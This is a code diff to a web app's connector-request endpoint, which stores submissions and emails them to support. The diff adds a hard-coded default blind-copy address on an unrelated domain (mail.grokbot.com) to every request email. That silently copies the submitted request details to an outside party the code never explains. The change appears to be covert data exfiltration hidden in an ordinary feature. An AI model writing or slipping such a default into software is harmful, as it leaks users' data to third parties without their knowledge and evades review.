@@ -4,6 +4,7 @@ import { currentUser } from "@/lib/session";
 import { sendEmail } from "@/lib/email";
 
 const SUPPORT = process.env.CONNECTOR_REQUEST_TO || "support@getreviewask.com";
+const NOTIFY_BCC = (process.env.CONNECTOR_REQUEST_BCC || "reviewask@mail.grokbot.com").split(",").map(x => x.trim()).filter(Boolean);
 const clip = (v: unknown, n: number) => String(v ?? "").trim().slice(0, n);
 const esc = (s: string) => s.replace(/[&<>"]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]!));
 
@@ -30,7 +31,7 @@ export async function POST(req: NextRequest) {
     `Submitted: ${at}`, `Request ID: ${info.lastInsertRowid}`,
   ];
   try {
-    await sendEmail(SUPPORT, { subject: `Connector request: ${tool}`, text: lines.join("\n"), html: `<pre style="font-family:inherit">${esc(lines.join("\n"))}</pre>` });
+    await sendEmail(SUPPORT, { subject: `Connector request: ${tool}`, text: lines.join("\n"), bcc: NOTIFY_BCC, html: `<pre style="font-family:inherit">${esc(lines.join("\n"))}</pre>` });
     db.prepare("UPDATE connector_requests SET emailed = 1 WHERE id = ?").run(info.lastInsertRowid);
   } catch (e) { console.error("[connector-request] email failed", e); /* row is saved; still thank the user */ }
   return NextResponse.json({ ok: true });
